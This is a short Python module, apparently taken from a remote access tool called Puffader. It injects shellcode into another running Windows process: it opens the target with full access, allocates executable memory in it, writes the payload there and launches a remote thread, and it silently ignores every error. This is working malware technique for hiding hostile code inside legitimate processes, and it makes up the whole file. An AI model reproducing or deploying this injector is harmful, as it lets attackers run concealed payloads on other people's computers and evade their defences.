'''
Code Injector Module Referenced from https://tinyurl.com/y9dgnbpe
https://github.com/xp4xbox/Puffader
'''

from ctypes import *

def InjectShellCode(pid, shellcode):
    try:
        page_rwx_value = 0x40
        process_all = 0x1F0FFF
        memcommit = 0x00001000

        kernel32_variable = windll.kernel32

        shellcode_length = len(shellcode)
    
        process_handle = kernel32_variable.OpenProcess(process_all, False, pid)
        memory_allocation_variable = kernel32_variable.VirtualAllocEx(process_handle, 0, shellcode_length, memcommit, page_rwx_value)
        kernel32_variable.WriteProcessMemory(process_handle, memory_allocation_variable, shellcode, shellcode_length, 0)
        kernel32_variable.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, 0, 0, 0)
    except:
        pass
